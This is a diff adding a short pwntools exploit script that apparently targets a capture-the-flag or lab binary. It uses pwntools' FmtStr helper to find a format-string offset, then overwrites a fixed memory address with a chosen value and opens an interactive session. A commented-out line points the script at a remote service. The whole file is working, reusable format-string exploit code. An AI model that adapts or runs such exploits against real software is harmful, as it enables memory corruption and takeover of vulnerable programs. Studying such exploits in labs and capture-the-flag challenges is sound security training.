@@ -1,0 +1,24 @@
+from pwn import *
+
+context.binary = binary = ELF("./foo")
+
+def exec_func(payload):
+    with process("./foo") as p:
+        p.sendline(payload)
+        p.recvuntil(b"input: ")
+        res = p.recvline()
+        print(res)
+        return res.strip()
+
+
+p = process()
+# p = remote("foo.com", 8088)
+
+fmtstr = FmtStr(exec_func)
+log.info(fmtstr.offset)
+heap_var = 0x00405060
+
+payload = b"A" * fmtstr.padlen + fmtstr_payload(fmtstr.offset, {heap_var: 0xAABBCCDD})
+p.sendline(payload)
+
+p.interactive()
